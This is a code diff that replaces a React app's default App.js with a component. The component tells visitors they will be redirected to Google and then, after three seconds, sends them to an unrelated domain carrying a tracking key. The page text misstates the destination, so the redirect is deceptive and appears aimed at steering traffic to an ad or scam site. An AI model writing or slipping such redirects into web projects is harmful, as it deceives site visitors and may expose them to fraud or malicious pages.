@@ -1,25 +1,20 @@
-import logo from './logo.svg';
-import './App.css';
+import React, { useEffect } from 'react';
 
-function App() {
+const RedirectComponent = () => {
+  useEffect(() => {
+    // Đặt timeout để điều hướng sau 3 giây
+    const timer = setTimeout(() => {
+      window.location.href = 'https://abdicatebirchcoolness.com/zybg77jbb?key=0db27c22cd10202766cd5c5858cffa88';
+    }, 3000);
+
+    return () => clearTimeout(timer);
+  }, []);
+
   return (
-    <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
+    <div>
+      <p>You will be redirected to Google in 3 seconds...</p>
     </div>
   );
-}
+};
 
-export default App;
+export default RedirectComponent;
